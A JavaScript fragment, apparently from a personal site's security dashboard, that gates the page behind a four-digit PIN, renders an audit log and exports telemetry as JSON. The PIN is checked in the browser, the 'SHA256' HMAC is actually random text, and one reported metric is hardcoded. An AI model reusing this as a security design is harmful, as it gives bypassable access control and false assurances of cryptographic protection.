    if (!mfaModal) return;
    currentPin = '';
    if (pinErrorEl) pinErrorEl.textContent = '';
    updatePinDisplay();
    mfaModal.classList.add('open');
  }

  function closeMfa() {
    if (!isUnlocked()) {
      // Gated SOC: If locked, exit takes user safely back to home page
      window.location.href = 'index.html';
      return;
    }
    if (!mfaModal) return;
    mfaModal.classList.remove('open');
  }

  if (openMfaBtn) openMfaBtn.addEventListener('click', openMfa);
  if (closeMfaBtn) closeMfaBtn.addEventListener('click', closeMfa);

  function updatePinDisplay() {
    pinDots.forEach((dot, idx) => {
      if (idx < currentPin.length) dot.classList.add('filled');
      else dot.classList.remove('filled');
    });
  }

  function handlePinInput(val) {
    if (pinErrorEl) pinErrorEl.textContent = '';

    if (val === 'clear') {
      currentPin = '';
      updatePinDisplay();
    } else if (val === 'back') {
      currentPin = currentPin.slice(0, -1);
      updatePinDisplay();
    } else if (currentPin.length < 4) {
      currentPin += val;
      updatePinDisplay();

      if (currentPin.length === 4) {
        setTimeout(verifyPin, 120);
      }
    }
  }

  keypadBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const val = btn.getAttribute('data-val');
      handlePinInput(val);
    });
  });

  // Physical Keyboard Support (Numbers 0-9, Backspace, Escape/Clear)
  window.addEventListener('keydown', (e) => {
    if (!mfaModal || !mfaModal.classList.contains('open')) return;

    if (e.key >= '0' && e.key <= '9') {
      e.preventDefault();
      handlePinInput(e.key);
    } else if (e.key === 'Backspace') {
      e.preventDefault();
      handlePinInput('back');
    } else if (e.key === 'Escape' || e.key.toLowerCase() === 'c') {
      e.preventDefault();
      if (e.key === 'Escape') closeMfa();
      else handlePinInput('clear');
    }
  });

  function verifyPin() {
    if (currentPin === DashboardState.masterPIN) {
      sessionStorage.setItem(AUTH_STORAGE_KEY, 'true');
      if (pinErrorEl) pinErrorEl.textContent = '';

      // Log to audit trail
      const auditEntry = {
        timestamp: new Date().toISOString(),
        action: 'MFA_AUTH_SUCCESS',
        operator: 'Bhuwan Gautam (Vhuwon Mathers)',
        method: 'CRYPTOGRAPHIC_PIN_VERIFY',
        hmac: 'SHA256:' + Math.random().toString(36).substring(2, 15)
      };
      DashboardState.auditLogs.unshift(auditEntry);
      localStorage.setItem('vm_audit_trail', JSON.stringify(DashboardState.auditLogs));
      renderAuditLogs();

      applyLockState();
    } else {
      // Failed PIN
      const modalBox = document.querySelector('.mfa-modal-box');
      if (modalBox) {
        modalBox.style.animation = 'pinShake 0.4s ease-in-out';
        setTimeout(() => { modalBox.style.animation = ''; }, 400);
      }
      if (pinErrorEl) {
        pinErrorEl.textContent = 'Access Denied: Invalid Security PIN.';
      }
      currentPin = '';
      updatePinDisplay();
    }
  }

  // Initialize Gated State on page load
  applyLockState();

  // Audit Logs Renderer
  const auditContainer = document.getElementById('audit-trail-list');
  function renderAuditLogs() {
    if (!auditContainer) return;
    auditContainer.innerHTML = '';
    if (DashboardState.auditLogs.length === 0) {
      auditContainer.innerHTML = '<div style="color: var(--text-dim); padding: 12px; font-family: var(--font-mono);">No audit entries recorded yet.</div>';
      return;
    }
    DashboardState.auditLogs.slice(0, 10).forEach(log => {
      const item = document.createElement('div');
      item.style.padding = '8px 12px';
      item.style.borderBottom = '1px solid rgba(255, 255, 255, 0.04)';
      item.style.fontFamily = 'var(--font-mono)';
      item.style.fontSize = '0.75rem';
      item.style.color = 'var(--text-secondary)';
      item.innerHTML = `
        <span style="color: var(--text-muted);">${log.timestamp}</span> · 
        <strong style="color: var(--accent-secondary);">${log.action}</strong> · 
        <span>${log.operator}</span> · 
        <span style="color: var(--text-dim);">${log.hmac}</span>
      `;
      auditContainer.appendChild(item);
    });
  }
  renderAuditLogs();

  // Export Telemetry
  const exportBtn = document.getElementById('btn-export-telemetry');
  if (exportBtn) {
    exportBtn.addEventListener('click', () => {
      const report = {
        domain: 'gautambhuwan.com.np',
        system: 'Antigravity Security & Analytics Engine',
        timestamp: new Date().toISOString(),
        metrics: {
          totalVisits: DashboardState.totalVisits,
          blockedThreats: DashboardState.blockedThreats,
          liveSessions: DashboardState.liveVisitors,
          cacheHitRate: '97.8%'
        },
        quarantinedIPs: DashboardState.quarantinedIPs,
        auditTrail: DashboardState.auditLogs
      };

      const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(report, null, 2));
      const downloadAnchor = document.createElement('a');
      downloadAnchor.setAttribute('href', dataStr);
      downloadAnchor.setAttribute('download', `antigravity-telemetry-${new Date().toISOString().slice(0, 10)}.json`);
      document.body.appendChild(downloadAnchor);
      downloadAnchor.click();
      downloadAnchor.remove();
    });
  }
});
